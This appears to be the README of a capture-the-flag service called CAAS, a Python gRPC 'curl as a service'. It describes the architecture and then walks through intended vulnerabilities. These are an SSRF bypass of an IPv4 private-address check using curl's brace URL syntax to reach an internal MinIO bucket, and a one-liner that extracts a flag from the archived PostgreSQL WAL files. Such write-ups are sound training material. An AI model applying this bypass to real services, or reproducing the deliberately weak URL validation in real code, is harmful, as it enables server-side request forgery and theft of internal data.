# CAAS

## Description

CAAS (curl as a service) service is a grpc service written in python. It allows clients to create profiles, enqueue curl's tasks and fetch results from the service. Workers are polling for tasks with URL info and do a GET request via `curl`. Curl's results are stored in MinIO S3 server. PostgreSQL is used as a database and job queue server.

## Architecture

```
        .------------.              .---------------.
        |            |              |               |
        |   client   |-----gRPC---->|  application  |
        |            |              |               |
        '------------'              '---------------'
                                         |  |
                                         |  |
  .-----------------------.              |  |        .-----------.
  |                       |              |  |        |           |
  |  PostgreSQL           |<---enqueue---'  '--get-->| MinIO S3  |
  |                       |                          |           |
  |                       |                          |           |
  |                       |                          |           |
  |                       |-----------WALs---------->| buckets:  |
  |  archive_mode = on    |                          | curl/     |
  |  archive_timeout = 60 |                          | wal/      |
  |                       |                          |           |
  |                       |<-dequeue--.     .--put-->|           |
  |                       |           |     |        |           |
  '-----------------------'           |     |        '-----------'
                                      |     |
                                      |     |
                                      |     |
                               .---------------.             .-,(  ),-.
                             .---------------. |          .-(          )-.
                             |               | |-------> (    internet    )
                             | cURL executor | |          '-(          ).-'
                             |               |-'              '-.( ).-'
                             '---------------'
```

## Flags

Flags are stored in table `users` in a JSON field `comment` at `profile` column.

## Vulns

There are several bugs in this service:

1. Non strict validation for incoming URL in this code:

```
host = urlparse(request.url).hostname
ip = ipaddress.IPv4Address(host)
if ip.is_private:
    raise Exception("Invalid host")
```

You can pass multiple URLs in a cURL braces notation like this `http://yandex.{ru,ua,by}`, which was parsed by `urlparse` as 1 URL with hostname `yandex.{ru,ua,by}`. Also you can pass user credentials and query string or fragment to avoid using `{` and `}` in hostname which was parsed by `urlparse`. For example:

```
>>> u = urlparse("http://{er:pass@yandex.ru#,yandex.by}")
>>> u.username
'{er'
>>> u.hostname
'yandex.ru'
>>> u.fragment
',yandex.by}'
>>>
```

But `curl` will detect 2 URL and make 2 requests: to yandex.ru with basic auth `{er:pass` and to yandex.by:

```
$ curl -v -s http://{er:pass@yandex.ru#,yandex.by} 2>&1 | grep Host
> Host: yandex.ru
> Host: yandex.by
```

So, for now, you can pass 2 URL in gRPC query, first from the internet (to bypass `ip.is_private` check) and second from the docker network.

2. There is a public bucket `wal` where PostgreSQL archives WAL files.

If passing URL to service like this `http://{0@1.1.1.1#,s3:9000}/wal/000000010000000000000007.gz`, you can grab WAL file `000000010000000000000007.gz` which contains a flag, as well as all other data changes in PostgreSQL. The next step is to get a flag from WAL file, the simplest way might look like this:

```
$ gunzip -c 000000010000000000000007.gz | strings -n32 | grep -P -o '\w{31}='
841WOR1PRTHNB4O5E6IY874A7E8558B=
```

List of all WAL files you can get via URL `http://s3:9000/wal`.
